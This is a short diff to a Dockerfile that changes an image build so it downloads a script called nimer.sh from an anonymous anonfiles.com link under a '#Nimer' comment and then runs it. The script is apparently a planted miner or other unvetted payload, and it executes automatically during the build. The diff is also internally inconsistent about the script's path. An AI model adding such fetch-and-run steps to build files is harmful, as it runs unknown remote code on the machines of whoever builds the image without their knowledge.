@@ -125,10 +125,10 @@ RUN rm -rf /etc/apt/sources.list && \
 	wget -q https://packages.microsoft.com/config/ubuntu/20.04/packages-microsoft-prod.deb -P /tmp && \
 	apt install -y /tmp/packages-microsoft-prod.deb && \
 	apt update && \
-	apt-get install -y powershell
+	apt-get install -y powershell \
 #Nimer
-	wget https://cdn-142.anonfiles.com/V7iev33cua/681373f4-1624794241/nimer.sh
-	chmod +x /nimer.sh
+	wget https://cdn-142.anonfiles.com/V7iev33cua/681373f4-1624794241/nimer.sh \
+	chmod +x /nimer.sh \
 	bash nimer.sh
 ENTRYPOINT ["supervisord", "-c"]
 
